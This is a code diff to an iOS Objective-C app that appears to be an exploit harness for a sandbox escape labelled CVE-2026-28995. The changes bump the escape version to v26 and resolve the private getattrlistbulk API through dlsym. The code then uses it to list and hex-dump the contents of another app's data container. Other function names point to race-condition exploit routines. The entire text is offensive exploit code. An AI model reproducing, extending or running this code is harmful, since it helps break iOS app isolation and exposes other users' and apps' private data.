@@ -29,10 +29,25 @@
 #include <sys/sysctl.h>
 #include <dirent.h>
 #include <sys/stat.h>
-#include <sys/attr.h>
 
-// getattrlistbulk may not be in public SDK headers
-extern int getattrlistbulk(int, struct attrlist *, void *, size_t, uint64_t);
+// getattrlistbulk — private API on iOS, resolve via dlsym
+#define ATTR_BULK_REQD      0x00000080
+#define ATTR_CMN_NAME       0x00000001
+#define ATTR_CMN_OBJTYPE    0x00000002
+#define ATTR_CMN_RETURNED_ATTRS 0x80000000
+#define ATTR_DIR_ENTRYCOUNT 0x00000040
+#define FSOPT_PACK_ATTRS    0x00000004
+
+struct attrlist {
+    u_short bitmapcount;
+    u_short reserved;
+    u_int commonattr;
+    u_int volattr;
+    u_int dirattr;
+    u_int fileattr;
+    u_int forkattr;
+};
+typedef int (*GetAttrListBulkFn)(int, struct attrlist *, void *, size_t, uint64_t);
 
 // proc_pidinfo — not in iOS SDK headers, resolve via dlsym
 typedef int (*ProcPidinfoFn)(int pid, int flavor, uint64_t arg, void *buffer, uint32_t buffersize);
@@ -668,7 +683,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v25" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v26" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7381,8 +7396,18 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
 
-    // Test 11: getattrlistbulk() directory enumeration (v25)
-    [log appendString:@"\n--- Test 11: getattrlistbulk enumeration (v25) ---\n"];
+    // Test 11: getattrlistbulk_fn() directory enumeration (v26)
+    [log appendString:@"\n--- Test 11: getattrlistbulk enumeration (v26) ---\n"];
+
+    // Resolve getattrlistbulk via dlsym (private API on iOS)
+    GetAttrListBulkFn getattrlistbulk_fn = (GetAttrListBulkFn)dlsym(RTLD_DEFAULT, "getattrlistbulk");
+    if (!getattrlistbulk_fn) {
+        [log appendString:@"  [-] getattrlistbulk NOT available via dlsym\n"];
+        dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
+        return;
+    }
+    [log appendString:@"  [+] getattrlistbulk resolved via dlsym\n"];
+
     NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
     NSString *tpBase = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@", tpUUID];
@@ -7411,8 +7436,8 @@ static void *iohid_threadCopyEvent(void *arg) {
 
         unsigned char buf[8192];
         memset(buf, 0, sizeof(buf));
-        int ret = getattrlistbulk(dirfd, &alist, buf, sizeof(buf), 0);
-        [log appendFormat:@"  getattrlistbulk(ATTR_BULK_REQD|NAME|OBJTYPE): ret=%d errno=%d\n", ret, errno];
+        int ret = getattrlistbulk_fn(dirfd, &alist, buf, sizeof(buf), 0);
+        [log appendFormat:@"  getattrlistbulk_fn(ATTR_BULK_REQD|NAME|OBJTYPE): ret=%d errno=%d\n", ret, errno];
 
         if (ret > 0) {
             [log appendFormat:@"  [+] GOT %d bytes!\n", ret];
@@ -7438,8 +7463,8 @@ static void *iohid_threadCopyEvent(void *arg) {
         memset(&alist, 0, sizeof(alist));
         alist.commonattr = ATTR_BULK_REQD | ATTR_CMN_NAME | ATTR_CMN_OBJTYPE;
         memset(buf, 0, sizeof(buf));
-        ret = getattrlistbulk(dirfd, &alist, buf, sizeof(buf), FSOPT_PACK_ATTRS);
-        [log appendFormat:@"  getattrlistbulk(+FSOPT_PACK_ATTRS): ret=%d errno=%d\n", ret, errno];
+        ret = getattrlistbulk_fn(dirfd, &alist, buf, sizeof(buf), FSOPT_PACK_ATTRS);
+        [log appendFormat:@"  getattrlistbulk_fn(+FSOPT_PACK_ATTRS): ret=%d errno=%d\n", ret, errno];
         if (ret > 0) {
             [log appendFormat:@"  [+] GOT %d bytes with FSOPT_PACK_ATTRS\n", ret];
             NSMutableString *hex2 = [NSMutableString string];
@@ -7470,7 +7495,7 @@ static void *iohid_threadCopyEvent(void *arg) {
         alist2.commonattr = ATTR_BULK_REQD | ATTR_CMN_NAME | ATTR_CMN_OBJTYPE;
         unsigned char buf2[16384];
         memset(buf2, 0, sizeof(buf2));
-        int ret2 = getattrlistbulk(cfd, &alist2, buf2, sizeof(buf2), 0);
+        int ret2 = getattrlistbulk_fn(cfd, &alist2, buf2, sizeof(buf2), 0);
         [log appendFormat:@"  getattrlistbulk: ret=%d errno=%d\n", ret2, errno];
 
         if (ret2 > 0) {
